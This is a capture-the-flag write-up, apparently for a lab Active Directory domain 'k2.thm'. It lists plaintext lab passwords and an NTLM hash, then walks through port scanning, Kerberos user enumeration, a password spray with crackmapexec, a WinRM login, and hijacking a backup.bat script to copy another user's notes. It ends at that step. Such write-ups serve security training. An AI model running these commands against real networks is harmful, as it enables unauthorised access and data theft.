# Summit

## Machine Info

From previous challenge:

FQDN: K2RootDC.k2.thm

Domain: k2.thm

Domain SID: S-1-5-21-1966530601-3185510712-10604624

```
# Domain User
k2.thm\r.bud:vRMkaVgdfxhW!8 
k2.thm\j.bold:#8rockyou
k2.thm\j.smith
K2\Administrator:vz0q$i8b4c

Administrator:500:aad3b435b51404eeaad3b435b51404ee:9545b61858c043477c350ae86c37b32f:::
```



## Port Scan

```bash
nmap -T4 -A -p- --min-rate 1000 10.10.0.17 -oN port_scan.txt

Nmap scan report for 10.10.0.17
Host is up (0.036s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-31 12:44:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=K2RootDC.k2.thm
| Not valid before: 2025-07-30T12:41:14
|_Not valid after:  2026-01-29T12:41:14
|_ssl-date: 2025-07-31T12:46:09+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2ROOTDC
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2RootDC.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-31T12:45:29+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: K2ROOTDC; OS: Windows; CPE: cpe:/o:microsoft:windows

```



## AD User validation

Verify the users obtained in the previous challenge with Kerberos&#x20;

```bash
./kerbrute_linux_amd64 userenum users_list.txt --domain k2.thm --dc 10.10.15.150
```

<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>



### Password Spray

Save all passwords found before and do a password spray with these 2 valid user.

<figure><img src="../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

```bash
crackmapexec smb 10.10.15.150 -u 'j.smith' -p passwd_list.txt

SMB         10.10.15.150    445    K2ROOTDC         [+] k2.thm\j.smith:vz0q$i8b4c
```

### WinRM as j.smith user

```bash
evil-winrm -i 10.10.15.150 -u 'j.smith' -p 'vz0q$i8b4c'
```

discover other user logon in the Server

```powershell
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/31/2025   1:58 PM                Administrator
d-----        5/30/2023   2:29 AM                j.smith
d-----        5/30/2023   1:31 AM                o.armstrong
d-r---       12/12/2018   7:45 AM                Public
```



## Bloodhound Enumeration

{% code overflow="wrap" %}
```bash
bloodhound-python -c all -ns 10.10.15.150 -dc K2RootDC.k2.thm -d k2.thm --zip -u 'j.smith' -p 'vz0q$i8b4c'
```
{% endcode %}

Nothing found :(



## Lateral Movement

Do a Windows Local Enumeration of the target and see this juicy directory

<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Inside it there is a .bat file with this content:

{% code overflow="wrap" %}
```powershell
*Evil-WinRM* PS C:\Scripts> more backup.bat

copy C:\Users\o.armstrong\Desktop\notes.txt C:\Users\o.armstrong\Documents\backup_notes.txt
```
{% endcode %}

The rights of the file is these:

```
*Evil-WinRM* PS C:\Scripts> icacls backup.bat
backup.bat NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Administrators:(I)(F)
           BUILTIN\Users:(I)(RX)
           K2\o.armstrong:(I)(F)
```

We can't overwrite the file but we can remove and replace the file.

```powershell
rm backup.bat

echo "copy C:\Users\o.armstrong\Desktop\notes.txt C:\Users\j.smith\Documents\backup_note
s.txt" > backup.bat
```
